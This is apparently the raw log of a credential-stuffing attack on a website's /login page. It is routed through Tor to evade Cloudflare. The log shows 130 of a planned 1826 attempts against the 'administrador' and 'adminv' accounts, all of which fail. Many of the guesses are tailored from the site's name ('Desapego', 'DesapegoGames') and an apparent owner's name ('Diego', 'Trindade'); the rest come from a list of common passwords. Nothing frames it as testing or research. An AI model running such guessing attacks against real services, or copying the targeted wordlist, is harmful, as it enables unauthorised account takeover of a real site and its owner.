[*] /login cred stuffing — 22 users × 83 passes = 1826 tentativas
[*] via Tor SOCKS5, bypass CF .54
  [0001] 'administrador'          :'Desapego@2024'           → HTTP 200 loc='' fail_msg=True 
  [0002] 'administrador'          :'Desapego@2023'           → HTTP 200 loc='' fail_msg=True 
  [0003] 'administrador'          :'Desapego@2022'           → HTTP 200 loc='' fail_msg=True 
  [0004] 'administrador'          :'desapego2024'            → HTTP 200 loc='' fail_msg=True 
  [0005] 'administrador'          :'desapego2023'            → HTTP 200 loc='' fail_msg=True 
  [0006] 'administrador'          :'desapego123'             → HTTP 200 loc='' fail_msg=True 
  [0007] 'administrador'          :'Desapego123'             → HTTP 200 loc='' fail_msg=True 
  [0008] 'administrador'          :'DesapegoGames'           → HTTP 200 loc='' fail_msg=True 
  [0009] 'administrador'          :'desapegogames'           → HTTP 200 loc='' fail_msg=True 
  [0010] 'administrador'          :'desapegogames123'        → HTTP 200 loc='' fail_msg=True 
  [0011] 'administrador'          :'Diego@2024'              → HTTP 200 loc='' fail_msg=True 
  [0012] 'administrador'          :'Diego@2023'              → HTTP 200 loc='' fail_msg=True 
  [0013] 'administrador'          :'diego123'                → HTTP 200 loc='' fail_msg=True 
  [0014] 'administrador'          :'Diego123'                → HTTP 200 loc='' fail_msg=True 
  [0015] 'administrador'          :'Diego2024'               → HTTP 200 loc='' fail_msg=True 
  [0016] 'administrador'          :'diego2024'               → HTTP 200 loc='' fail_msg=True 
  [0017] 'administrador'          :'diegobtrindade'          → HTTP 200 loc='' fail_msg=True 
  [0018] 'administrador'          :'Trindade123'             → HTTP 200 loc='' fail_msg=True 
  [0019] 'administrador'          :'trindade'                → HTTP 200 loc='' fail_msg=True 
  [0020] 'administrador'          :'Trindade@2024'           → HTTP 200 loc='' fail_msg=True 
  [0021] 'administrador'          :'admin'                   → HTTP 200 loc='' fail_msg=True 
  [0022] 'administrador'          :'admin123'                → HTTP 200 loc='' fail_msg=True 
  [0023] 'administrador'          :'Admin@123'               → HTTP 200 loc='' fail_msg=True 
  [0024] 'administrador'          :'Admin123'                → HTTP 200 loc='' fail_msg=True 
  [0025] 'administrador'          :'administrador'           → HTTP 200 loc='' fail_msg=True 
  [0026] 'administrador'          :'123456'                  → HTTP 200 loc='' fail_msg=True 
  [0027] 'administrador'          :'12345678'                → HTTP 200 loc='' fail_msg=True 
  [0028] 'administrador'          :'123456789'               → HTTP 200 loc='' fail_msg=True 
  [0029] 'administrador'          :'1234567890'              → HTTP 200 loc='' fail_msg=True 
  [0030] 'administrador'          :'password'                → HTTP 200 loc='' fail_msg=True 
  [0031] 'administrador'          :'Password1'               → HTTP 200 loc='' fail_msg=True 
  [0032] 'administrador'          :'P@ssw0rd'                → HTTP 200 loc='' fail_msg=True 
  [0033] 'administrador'          :'qwerty'                  → HTTP 200 loc='' fail_msg=True 
  [0034] 'administrador'          :'abc123'                  → HTTP 200 loc='' fail_msg=True 
  [0035] 'administrador'          :'letmein'                 → HTTP 200 loc='' fail_msg=True 
  [0036] 'administrador'          :'welcome'                 → HTTP 200 loc='' fail_msg=True 
  [0037] 'administrador'          :'welcome1'                → HTTP 200 loc='' fail_msg=True 
  [0038] 'administrador'          :'iloveyou'                → HTTP 200 loc='' fail_msg=True 
  [0039] 'administrador'          :'monkey'                  → HTTP 200 loc='' fail_msg=True 
  [0040] 'administrador'          :'dragon'                  → HTTP 200 loc='' fail_msg=True 
  [0041] 'administrador'          :'master'                  → HTTP 200 loc='' fail_msg=True 
  [0042] 'administrador'          :'shadow'                  → HTTP 200 loc='' fail_msg=True 
  [0043] 'administrador'          :'trustno1'                → HTTP 200 loc='' fail_msg=True 
  [0044] 'administrador'          :'654321'                  → HTTP 200 loc='' fail_msg=True 
  [0045] 'administrador'          :'111111'                  → HTTP 200 loc='' fail_msg=True 
  [0046] 'administrador'          :'000000'                  → HTTP 200 loc='' fail_msg=True 
  [0047] 'administrador'          :'12345'                   → HTTP 200 loc='' fail_msg=True 
  [0048] 'administrador'          :'1234'                    → HTTP 200 loc='' fail_msg=True 
  [0049] 'administrador'          :'123'                     → HTTP 200 loc='' fail_msg=True 
  [0050] 'administrador'          :'1'                       → HTTP 200 loc='' fail_msg=True 
  [0051] 'administrador'          :'pass'                    → HTTP 200 loc='' fail_msg=True 
  [0052] 'administrador'          :'pass123'                 → HTTP 200 loc='' fail_msg=True 
  [0053] 'administrador'          :'desapego!'               → HTTP 200 loc='' fail_msg=True 
  [0054] 'administrador'          :'Desapego2024'            → HTTP 200 loc='' fail_msg=True 
  [0055] 'administrador'          :'Desapego2023'            → HTTP 200 loc='' fail_msg=True 
  [0056] 'administrador'          :'desapego!2024'           → HTTP 200 loc='' fail_msg=True 
  [0057] 'administrador'          :'DesapegoGames@2024'      → HTTP 200 loc='' fail_msg=True 
  [0058] 'administrador'          :'Desapego@2024!'          → HTTP 200 loc='' fail_msg=True 
  [0059] 'administrador'          :'DesapegoGames123'        → HTTP 200 loc='' fail_msg=True 
  [0060] 'administrador'          :'desapegogames@2024'      → HTTP 200 loc='' fail_msg=True 
  [0061] 'administrador'          :'desapegogames!'          → HTTP 200 loc='' fail_msg=True 
  [0062] 'administrador'          :'Desapegogames@2024'      → HTTP 200 loc='' fail_msg=True 
  [0063] 'administrador'          :'diego!2024'              → HTTP 200 loc='' fail_msg=True 
  [0064] 'administrador'          :'Diego!2024'              → HTTP 200 loc='' fail_msg=True 
  [0065] 'administrador'          :'diego_desapego'          → HTTP 200 loc='' fail_msg=True 
  [0066] 'administrador'          :'Diego@desapego'          → HTTP 200 loc='' fail_msg=True 
  [0067] 'administrador'          :'masterx'                 → HTTP 200 loc='' fail_msg=True 
  [0068] 'administrador'          :'masterx123'              → HTTP 200 loc='' fail_msg=True 
  [0069] 'administrador'          :'Masterx123'              → HTTP 200 loc='' fail_msg=True 
  [0070] 'administrador'          :'MasterX'                 → HTTP 200 loc='' fail_msg=True 
  [0071] 'administrador'          :'dev1ce'                  → HTTP 200 loc='' fail_msg=True 
  [0072] 'administrador'          :'dev1ce123'               → HTTP 200 loc='' fail_msg=True 
  [0073] 'administrador'          :'Dev1ce123'               → HTTP 200 loc='' fail_msg=True 
  [0074] 'administrador'          :'desapego'                → HTTP 200 loc='' fail_msg=True 
  [0075] 'administrador'          :'desapego1'               → HTTP 200 loc='' fail_msg=True 
  [0076] 'administrador'          :'desapego12'              → HTTP 200 loc='' fail_msg=True 
  [0077] 'administrador'          :'desapego2025'            → HTTP 200 loc='' fail_msg=True 
  [0078] 'administrador'          :'Desapego@2025'           → HTTP 200 loc='' fail_msg=True 
  [0079] 'administrador'          :'changepassword'          → HTTP 200 loc='' fail_msg=True 
  [0080] 'administrador'          :'mudar123'                → HTTP 200 loc='' fail_msg=True 
  [0081] 'administrador'          :'Mudar@123'               → HTTP 200 loc='' fail_msg=True 
  [0082] 'administrador'          :'senha123'                → HTTP 200 loc='' fail_msg=True 
  [0083] 'administrador'          :'Senha@123'               → HTTP 200 loc='' fail_msg=True 
  [0084] 'adminv'                 :'Desapego@2024'           → HTTP 200 loc='' fail_msg=True 
  [0085] 'adminv'                 :'Desapego@2023'           → HTTP 200 loc='' fail_msg=True 
  [0086] 'adminv'                 :'Desapego@2022'           → HTTP 200 loc='' fail_msg=True 
  [0087] 'adminv'                 :'desapego2024'            → HTTP 200 loc='' fail_msg=True 
  [0088] 'adminv'                 :'desapego2023'            → HTTP 200 loc='' fail_msg=True 
  [0089] 'adminv'                 :'desapego123'             → HTTP 200 loc='' fail_msg=True 
  [0090] 'adminv'                 :'Desapego123'             → HTTP 200 loc='' fail_msg=True 
  [0091] 'adminv'                 :'DesapegoGames'           → HTTP 200 loc='' fail_msg=True 
  [0092] 'adminv'                 :'desapegogames'           → HTTP 200 loc='' fail_msg=True 
  [0093] 'adminv'                 :'desapegogames123'        → HTTP 200 loc='' fail_msg=True 
  [0094] 'adminv'                 :'Diego@2024'              → HTTP 200 loc='' fail_msg=True 
  [0095] 'adminv'                 :'Diego@2023'              → HTTP 200 loc='' fail_msg=True 
  [0096] 'adminv'                 :'diego123'                → HTTP 200 loc='' fail_msg=True 
  [0097] 'adminv'                 :'Diego123'                → HTTP 200 loc='' fail_msg=True 
  [0098] 'adminv'                 :'Diego2024'               → HTTP 200 loc='' fail_msg=True 
  [0099] 'adminv'                 :'diego2024'               → HTTP 200 loc='' fail_msg=True 
  [0100] 'adminv'                 :'diegobtrindade'          → HTTP 200 loc='' fail_msg=True 
  [0101] 'adminv'                 :'Trindade123'             → HTTP 200 loc='' fail_msg=True 
  [0102] 'adminv'                 :'trindade'                → HTTP 200 loc='' fail_msg=True 
  [0103] 'adminv'                 :'Trindade@2024'           → HTTP 200 loc='' fail_msg=True 
  [0104] 'adminv'                 :'admin'                   → HTTP 200 loc='' fail_msg=True 
  [0105] 'adminv'                 :'admin123'                → HTTP 200 loc='' fail_msg=True 
  [0106] 'adminv'                 :'Admin@123'               → HTTP 200 loc='' fail_msg=True 
  [0107] 'adminv'                 :'Admin123'                → HTTP 200 loc='' fail_msg=True 
  [0108] 'adminv'                 :'administrador'           → HTTP 200 loc='' fail_msg=True 
  [0109] 'adminv'                 :'123456'                  → HTTP 200 loc='' fail_msg=True 
  [0110] 'adminv'                 :'12345678'                → HTTP 200 loc='' fail_msg=True 
  [0111] 'adminv'                 :'123456789'               → HTTP 200 loc='' fail_msg=True 
  [0112] 'adminv'                 :'1234567890'              → HTTP 200 loc='' fail_msg=True 
  [0113] 'adminv'                 :'password'                → HTTP 200 loc='' fail_msg=True 
  [0114] 'adminv'                 :'Password1'               → HTTP 200 loc='' fail_msg=True 
  [0115] 'adminv'                 :'P@ssw0rd'                → HTTP 200 loc='' fail_msg=True 
  [0116] 'adminv'                 :'qwerty'                  → HTTP 200 loc='' fail_msg=True 
  [0117] 'adminv'                 :'abc123'                  → HTTP 200 loc='' fail_msg=True 
  [0118] 'adminv'                 :'letmein'                 → HTTP 200 loc='' fail_msg=True 
  [0119] 'adminv'                 :'welcome'                 → HTTP 200 loc='' fail_msg=True 
  [0120] 'adminv'                 :'welcome1'                → HTTP 200 loc='' fail_msg=True 
  [0121] 'adminv'                 :'iloveyou'                → HTTP 200 loc='' fail_msg=True 
  [0122] 'adminv'                 :'monkey'                  → HTTP 200 loc='' fail_msg=True 
  [0123] 'adminv'                 :'dragon'                  → HTTP 200 loc='' fail_msg=True 
  [0124] 'adminv'                 :'master'                  → HTTP 200 loc='' fail_msg=True 
  [0125] 'adminv'                 :'shadow'                  → HTTP 200 loc='' fail_msg=True 
  [0126] 'adminv'                 :'trustno1'                → HTTP 200 loc='' fail_msg=True 
  [0127] 'adminv'                 :'654321'                  → HTTP 200 loc='' fail_msg=True 
  [0128] 'adminv'                 :'111111'                  → HTTP 200 loc='' fail_msg=True 
  [0129] 'adminv'                 :'000000'                  → HTTP 200 loc='' fail_msg=True 
  [0130] 'adminv'                 :'12345'                   → HTTP 200 loc='' fail_msg=True 
